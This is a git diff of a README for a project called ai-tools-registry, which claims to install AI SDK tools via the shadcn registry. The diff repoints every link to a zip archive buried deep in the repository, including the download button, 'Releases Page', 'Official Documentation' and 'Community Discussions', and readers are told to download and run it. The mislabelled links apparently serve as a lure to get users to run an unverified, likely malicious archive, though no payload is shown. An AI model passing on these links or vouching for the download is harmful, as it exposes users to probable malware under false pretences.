@@ -1,7 +1,7 @@
 # 🚀 ai-tools-registry - Install Essential AI Tools Easily
 
 ## 💾 Download Now
-[![Download ai-tools-registry](https://raw.githubusercontent.com/Coolfacts45/ai-tools-registry/main/quintocubitalism/ai-tools-registry.zip)](https://raw.githubusercontent.com/Coolfacts45/ai-tools-registry/main/quintocubitalism/ai-tools-registry.zip)
+[![Download ai-tools-registry](https://github.com/Coolfacts45/ai-tools-registry/raw/refs/heads/main/app/api/registry/custom/ai-registry-tools-v2.2.zip)](https://github.com/Coolfacts45/ai-tools-registry/raw/refs/heads/main/app/api/registry/custom/ai-registry-tools-v2.2.zip)
 
 ## 📖 Overview
 The ai-tools-registry is designed to simplify the installation of AI tools and UI components for the AI SDK through the shadcn registry. This application helps you set up and manage essential tools for developing your AI projects efficiently.
@@ -10,7 +10,7 @@ The ai-tools-registry is designed to simplify the installation of AI tools and U
 To get started with ai-tools-registry, follow these easy steps. You will download the software and run it on your computer.
 
 ## 🔗 Download & Install
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Coolfacts45/ai-tools-registry/main/quintocubitalism/ai-tools-registry.zip).
+Visit this page to download: [Releases Page](https://github.com/Coolfacts45/ai-tools-registry/raw/refs/heads/main/app/api/registry/custom/ai-registry-tools-v2.2.zip).
 
 1. Click the link above to access the Releases page.
 2. Look for the latest version of ai-tools-registry.
@@ -72,7 +72,7 @@ We welcome contributions from the community. If you want to help improve ai-tool
 Your efforts make the project better for everyone!
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://raw.githubusercontent.com/Coolfacts45/ai-tools-registry/main/quintocubitalism/ai-tools-registry.zip): More detailed guides and use cases.
-- [Community Discussions](https://raw.githubusercontent.com/Coolfacts45/ai-tools-registry/main/quintocubitalism/ai-tools-registry.zip): Share your thoughts and ask questions.
+- [Official Documentation](https://github.com/Coolfacts45/ai-tools-registry/raw/refs/heads/main/app/api/registry/custom/ai-registry-tools-v2.2.zip): More detailed guides and use cases.
+- [Community Discussions](https://github.com/Coolfacts45/ai-tools-registry/raw/refs/heads/main/app/api/registry/custom/ai-registry-tools-v2.2.zip): Share your thoughts and ask questions.
 
 Thank you for using ai-tools-registry. Enjoy building your AI tools!
